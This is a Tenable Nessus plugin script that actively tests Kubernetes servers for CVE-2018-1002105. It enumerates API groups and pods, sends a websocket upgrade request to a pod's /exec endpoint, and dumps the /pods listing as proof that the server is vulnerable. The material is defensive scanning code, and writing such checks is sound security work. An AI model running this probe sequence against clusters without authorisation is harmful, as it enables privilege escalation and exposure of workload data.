#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(119677);
  script_version("1.3");
  script_cvs_date("Date: 2019/04/05 23:25:05");

  script_cve_id(
    "CVE-2018-1002105"
  );
  script_bugtraq_id(
    106068    
  );

  script_name(english:"Kubernetes proxy request handling vulnerability (CVE-2018-1002105)");
  script_summary(english:"Unauthenticated exploit for Kubernetes CVE-2018-1002105.");

  script_set_attribute(attribute:"synopsis", value:
"The remote Kubernetes server is affected by a proxy request handling vulnerability
which enables an unauthorized attacker to send arbitrary requests.");
  script_set_attribute(attribute:"description", value:
"A remote, unauthenticated attacker may be able to leverage API calls 
to escalate privileges via proxy request handling vulnerability.

Note that a successful attack requires that an API extension server is
directly accessible from the Kubernetes API server's network or that
a cluster has granted pod exec, attach, port-forward permissions too
loosely.");

  # https://groups.google.com/forum/#!topic/kubernetes-announce/GVllWCg6L88
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?24a13549");
  # https://github.com/kubernetes/kubernetes/blob/master/CHANGELOG-1.10.md/#v11011
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?98c83f19");
  # https://github.com/kubernetes/kubernetes/blob/master/CHANGELOG-1.11.md/#v1115
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?ec479a99");
  # https://github.com/kubernetes/kubernetes/blob/master/CHANGELOG-1.12.md/#v1123
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?e1cc1943");
  script_set_attribute(attribute:"see_also", value:"https://github.com/kubernetes/kubernetes/issues/71411");
  script_set_attribute(attribute:"solution", value:
"Upgrade to Kubernetes 1.10.11, 1.11.5, 1.12.3 or later.");

  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:OF/RC:C");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_set_cvss3_temporal_vector("CVSS:3.0/E:P/RL:O/RC:C");
  script_set_attribute(attribute:"cvss_score_source", value:"CVE-2018-1002105");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2018/11/26");
  script_set_attribute(attribute:"patch_publication_date", value:"2018/11/26");
  script_set_attribute(attribute:"plugin_publication_date", value:"2018/12/14");

  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:google:kubernetes");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2018-2019 and is owned by Tenable, Inc. or an Affiliate thereof.");

  script_dependencies("http_version.nasl");
  script_require_ports("Services/www", 443, 6443, 8443);

  exit(0);
}

include('global_settings.inc');
include('misc_func.inc');
include('http.inc');
include('audit.inc');
include('json.inc');
include('spad_log_func.inc');


##
# Adds log message specified by param 'message' to the
# log handle / file with a hard-coded name.
# 
# @param [message:string] required - message to log
##
function debug_log(message)
{
  if(!empty_or_null(message))
    spad_log(message:message, name:'kube_cve_2018_1002105.log');
}

##
# Quick web response JSON validation.
# 
# @param res request response
# 
# @return [int] TRUE/FALSE for a quick JSON validation
##
function json_web_validate(res)
{
  debug_log(message:'\nEntering json_web_validate(res)\n');
  debug_log(message:
    '\nSTATUS:\n' + res[0] +
    '\nHEADERS:\n' + res[1] +
    '\nBODY:\n' + res[2]
    );
  if (empty_or_null(res) || res[0] !~ '200' || res[1] !~ 'application/json')
    return FALSE;
  if (typeof(json_read(res[2])) != "array")
    return FALSE;
  debug_log(message:'\nSuccessfully validated json_web_validate(res)\n');
  return TRUE;
}


##
# Tries to access and add /version to report
# Will audit if the /version endpoint is not accessible
# 
# @return [NULL]
##
function sanity_check()
{
  debug_log(message:'\nEntering sanity_check()\n');
  res = http_send_recv3(
    method:'GET',
    item:'/version',
    port:port,
    exit_on_fail:TRUE
    );
  debug_log(message:
    '\nURL:\n/version' +
    '\nSTATUS:\n' + res[0] +
    '\nHEADERS:\n' + res[1] +
    '\nBODY:\n' + res[2]
    );
  if (!json_web_validate(res:res)) audit(AUDIT_WRONG_WEB_SERVER, port, 'serving JSON');

  report += '\n\n' + res[2];
  debug_log(message:'\nExiting sanity_check()\n');
}


##
# Tries to search for a potentially vulnerable pod
# Will audit if the /version endpoint is not accessible
# 
# @return [string] url for use in http_send_recv3(item) or NULL
##
function find_test_pod_url()
{
  debug_log(message:'\nEntering find_test_pod_url()\n');
  res = http_send_recv3(
    method:'GET',
    item:'/apis',
    port:port,
    exit_on_fail:TRUE
    );

  debug_log(message:
    '\nURL:\n/apis' +
    '\nSTATUS:\n' + res[0] +
    '\nHEADERS:\n' + res[1] +
    '\nBODY:\n' + res[2]
    );
  if (!json_web_validate(res:res)) audit(AUDIT_WRONG_WEB_SERVER, port, 'serving JSON');


  local_var json_api = json_read(res[2]);
  if((json_api[0]['kind'] != 'APIGroupList') || (json_api[0]['apiVersion'] != 'v1') || (empty_or_null(json_api[0]['groups'])))
    audit(AUDIT_WRONG_WEB_SERVER, port, 'not able to access Kubernetes API');

  report += '\n\nPotentially vulnerable aggregated API server(s):';

  # find clusters potentially accessible via API
  local_var group = '';
  foreach group (json_api[0]['groups'])
  {
    local_var grp_ver = group['versions'][0]['groupVersion'];
    if (empty_or_null(grp_ver)) continue;

    res = http_send_recv3(
      method:'GET',
      item:'/apis/' + grp_ver + '/pods',
      port:port,
      exit_on_fail:FALSE
      );
    debug_log(message:
      '\nURL:\n' + '/apis/' + grp_ver + '/pods' +
      '\nSTATUS:\n' + res[0] +
      '\nHEADERS:\n' + res[1] +
      '\nBODY:\n' + res[2]
      );

    if (!json_web_validate(res:res)) continue;

    local_var json_pods = json_read(res[2]);
    report += '\n' + build_url(port:port, qs:'/apis/' + grp_ver);

    # find any pod.. and return it
    local_var item = '';
    foreach item (json_pods[0]['items'])
    {
      local_var self_lnk = item['metadata']['selfLink'];
      if (empty_or_null(self_lnk)) continue;

      # we only need one pod to test priv escalation
      debug_log(message:'\nPossibly exploitable:\n' + self_lnk +'\nExiting find_test_pod_url()');
      return self_lnk;
    }
  }
  return NULL;
}


##
# Tries to get a privilege escalation for a give url and port
# Will audit on fail
# Will set the VULNERABLE to true otherwise.
# 
# @return [NULL]
##
function check_exec_pod()
{
  debug_log(message:'\nEntering check_exec_pod()\n');
  # forcing keep alive to keep the same socket connection
  http_force_keep_alive(port:port);
  local_var add_headers = make_array(
    'Connection', 'upgrade',
    'Upgrade', 'websocket'
    );
  # Sending a request to /exec
  res = http_send_recv3(
    method:'GET',
    item:url+ '/exec',
    port:port,
    add_headers:add_headers,
    fetch404:TRUE,
    exit_on_fail:TRUE
    );
  debug_log(message:
    '\nURL:\n' + url + '/exec' +
    '\nSTATUS:\n' + res[0] +
    '\nHEADERS:\n' + res[1] +
    '\nBODY:\n' + res[2]
    );

  if (empty_or_null(res))
    audit(AUDIT_WRONG_WEB_SERVER, port, 'sending empty response');
  if ((res[0] =~ '403') || (res[2] =~ 'you must specify at least 1 of stdin, stdout, stderr'))
    audit(AUDIT_LISTEN_NOT_VULN, 'Kubernetes', port);
  # vulnerable server should not close the socket connection
  if (!(__ka_socket && __ka_port == port))
    audit(AUDIT_LISTEN_NOT_VULN, 'Kubernetes', port);

  # request to get the /pods for report
  res = http_send_recv3(
    method:'GET',
    item:'/pods',
    port:port,
    add_headers:add_headers,
    fetch404:TRUE,
    exit_on_fail:TRUE
    );
  debug_log(message:
    '\nURL:\n/pods' +
    '\nSTATUS:\n' + res[0] +
    '\nHEADERS:\n' + res[1] +
    '\nBODY:\n' + res[2]
    );
  if ((empty_or_null(res)) || (res[1] !~ 'application/json'))
    audit(AUDIT_WRONG_WEB_SERVER, port, 'serving JSON');

  report += '\n\nRun a successful test for\n' + build_url(port:port, qs:url);
  report += '\n\nThe following are the contents of /pods endpoint ';
  report += build_url(port:port, qs:'/pods'); 
  report +='\n\n' + res[2];

  VULNERABLE = TRUE;
  debug_log(message:'\nExiting check_exec_pod()\n');
}

### MAIN ### 
VULNERABLE = FALSE;
res = '';

port = get_http_port(default:443);
if (!get_port_state(port)) audit(AUDIT_PORT_CLOSED, port);
debug_log(message:'\n\nSTARTING\n' +'PORT ' + port +'\n');

report = '\nKubernetes is open for anonymous access.\n';
report += '\nDump of ' + build_url(port:port, qs:'/version');

sanity_check();
url = find_test_pod_url();
if (empty_or_null(url)) audit(AUDIT_WRONG_WEB_SERVER, port, 'not responding as expected');
check_exec_pod();
debug_log(message:'\nERROR:SUCCESS!\n');

if (VULNERABLE)
  security_report_v4(severity:SECURITY_HOLE, port:port, extra:report);